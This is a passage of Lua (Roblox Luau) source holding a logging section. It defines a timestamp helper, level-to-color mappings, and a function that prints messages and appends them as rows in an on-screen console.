-- §5  LOGGING
-- ════════════════════════════════════════════════════════════════════════

local function ts() local t=os.date("*t"); return ("%02d:%02d:%02d"):format(t.hour,t.min,t.sec) end

local LC = { INFO=T.INFO, WARN=T.WARN, CRIT=T.CRIT, OK=T.OK, EXEC=T.ACC, SYS=T.TXS, FUZZ=T.PRP }

local function log(level, msg)
    msg = tostring(msg)
    local color = LC[level] or T.TXT
    print(("[SSv4][%s][%s] %s"):format(ts(), level, msg))
    if not ConsoleList then return end
    local row = Instance.new("Frame")
    row.Size = UDim2.new(1,-8,0,17)
    row.BackgroundTransparency = 1
    row.LayoutOrder = #S + 1
    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1,0,1,0)
    lbl.BackgroundTransparency = 1
    lbl.TextColor3 = color
    lbl.Font = Enum.Font.Code
    lbl.TextSize = 11
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Text = ("[%s][%s] %s"):format(ts(), level, msg)
    lbl.TextTruncate = Enum.TextTruncate.AtEnd
    lbl.Parent = row
    row.Parent = ConsoleList
    task.defer(function()
        local sf = ConsoleList.Parent
        if sf and sf:IsA("ScrollingFrame") then sf.CanvasPosition = Vector2.new(0,math.huge) end
    end)
end

